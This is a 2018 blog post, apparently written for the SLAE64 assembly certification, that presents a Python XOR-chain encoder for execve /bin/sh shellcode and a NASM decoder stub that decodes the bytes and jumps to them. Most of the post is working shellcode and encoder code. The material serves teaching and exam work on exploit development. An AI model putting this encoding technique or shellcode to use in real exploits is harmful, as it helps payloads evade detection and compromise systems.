title: XORChain Encoded Shellcode
date: 2018-05-19
published: true 
summary: My solution to SLAE64 Exam Question 4
tags: shellcode, exploit, assembly

# XORChain Encoded Shellcode

This is my solution to the fourth exam question of the SLAE64 certification. This exercise was to write an encoder for shellcode, as well as a working demo with a decoder stub to decode the instructions and then jump to them.

To be clear, encoding is not encryption. It is meant to transform the data in some way, but is not meant to be safe from efforts to reverse the encoding. In fact, knowledge of the encoding scheme should be sufficient to decode the data. However, I borrowed an concept from encryption in my encoding scheme: cipher-block chaining. In such an encryption scheme, the output of each data block transform is used as input to the subsequent data block transform. I borrowed this concept and created an encode-block chain... or something.

Basically, my scheme is just a `xor` chain. It `xor`s the first byte with `0x00`, then the second with the output of that, then the third byte with the output of the second byte transform, and so on. Definitely not encryption. I wrote an encoder to generate encoded shellcode in Python:

    #!/usr/bin/python

    # python xorchain encoder
    # based on class insertion encoder
    # b0_enc = b0_clear ^ 0x00 (nop)
    # b1_enc = b1_clear ^ b0_enc
    # b2_enc = b2_clear ^ b1_enc

    import random

    shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

    encoded = ""
    encoded2 = ""
    print 'Encoded shellcode ...'

    prev = 0x00;
    for x in bytearray(shellcode) :
        xored = x ^ prev            
        encoded += '\\x'
        encoded += '%02x' % xored
        encoded2 += '0x'
        encoded2 += '%02x,' %xored
        prev = xored


    print encoded
    print encoded2
    print 'Len: %d' % len(bytearray(shellcode))

![py encoder](/static/blog/2018/SLAE64/4/python_encoder.png)

The shellcode generated here is shellcode used in other parts of this course, it just spawns `/bin/sh` to give you a shell.

To decode, I had to start at the last byte, decode it by `xor`ing it with the previous byte, and work my way backwards until the first byte - which is unchanged as `xor 0x00` is a nop. Of course, the decoder is in assembly rather than Python:

    ;loosely based on insertion-decoder.nasm from security-tube class
    ;encoding scheme is simple - xor chain, need to walk backwards to decode
    ;currently 'decodes' hardcoded number of bytes (instead of having markers)

    global _start           

    section .text
    _start:
        jmp decoder 
        encoded_shellcode: db 0x48,0x79,0xb9,0xe9,0xa1,0x1a,0x35,0x57,0x3e,0x50,0x7f,0x50,0x23,0x4b,0x18,0x50,0xd9,0x3e,0x6e,0x26,0xaf,0x4d,0x1a,0x52,0xdb,0x3d,0x75,0xf6,0x36,0x0d,0x02,0x07 

    decoder:
        ;prep stuff
        lea rsi, [rel encoded_shellcode]
        xor rax, rax
        xor rdx, rdx
        mov al, 0x20
        
        
    decode: 
        sub al, 1
        mov bl, byte [ rsi + rax ]
        xor byte [ rsi + rax + 1], bl
        ;check if done
        cmp dl, al 
        jz short encoded_shellcode
        jmp short decode

As mentioned in the comments, the main decision with a decoder like this is how to mark the end of the data. Generally this will either be passed to a function, set by markers (like 0x00 for strings) or just hardcoded. My code is just hardcoded to walk 31 bytes back since I know that's the length of my shellcode. 

After `xor`ing 31 bytes, I just jump to the now decoded shellcode, and get my shell:

![decode shell](/static/blog/2018/SLAE64/4/decode_shell.png)

The shellcode is 64 bytes total, but remember 32 of those are the `execve` shellcode contents. So the decoder stub is actually 32 bytes.

All code referenced in this blog post is available at: <https://github.com/mrT-F/SLAE64/tree/master/4>

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification*

*Certification at: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>*

*Student ID: SLAE64 - 1546*